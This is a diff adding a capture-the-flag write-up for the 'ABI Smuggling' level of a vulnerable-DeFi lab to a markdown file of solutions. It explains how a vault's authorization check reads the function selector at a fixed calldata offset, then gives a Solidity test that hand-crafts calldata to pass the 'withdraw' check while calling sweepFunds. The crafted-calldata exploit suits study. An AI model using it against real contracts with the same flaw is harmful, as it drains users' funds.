@@ -18,6 +18,7 @@ In the explanations below, I assume that you are familiar with contracts.
 [12. Climber](#12-climber)  
 [13. Wallet Mining](#13-wallet-mining)  
 [14. Puppet V3](#14-puppet-v3)  
+[15. ABI Smuggling](#15-abi-smuggling)  
 
 ## 1. Unstoppable
 
@@ -1396,4 +1397,77 @@ Attack flow:
         weth.approve(address(lendingPool), wethRequired);
         lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
         token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+
+## 15. ABI Smuggling
+
+### Challenge Overview
+
+There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.  
+The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.    
+The dev team has received a responsible disclosure saying all funds can be stolen.  
+Rescue all funds from the vault, transferring them to the designated recovery account.  
+
+### Vulnerability Analysis
+
+The ABI Smuggling challenge exposes a critical vulnerability in the authorization system of the SelfAuthorizedVault contract. Despite implementing a seemingly robust permission system, the contract fails to properly validate function calls, allowing an attacker to bypass restrictions and drain the vault.
+The core vulnerability lies in the execute() function within the AuthorizedExecutor contract:   
+
+    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
+        // Read the 4-bytes selector at the beginning of `actionData`
+        bytes4 selector;
+        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
+        assembly {
+            selector := calldataload(calldataOffset)
+        }
+
+        if (!permissions[getActionId(selector, msg.sender, target)]) {
+            revert NotAllowed();
+        }
+
+        _beforeFunctionCall(target, actionData);
+
+        return target.functionCall(actionData);
+    }   
+
+This implementation is vulnerable due to a fundamental mismatch between permission checking and execution. The code assumes actionData always begins at position 100 (4 + 32 * 3), ignoring the fact that in ABI encoding, the actual location is determined by a dynamic offset. There is no validation of actionData integrity, as the code extracts what it thinks is the function selector without verifying it's examining the correct position. Most critically, the code checks permissions based on bytes at a fixed position but executes the entire actionData regardless of what the permission check actually examined, creating a severe permission check/execution mismatch.
+
+
+### Solution
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_abiSmuggling() public checkSolvedByPlayer {
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        address(vault).call(calldataPayload);
     }
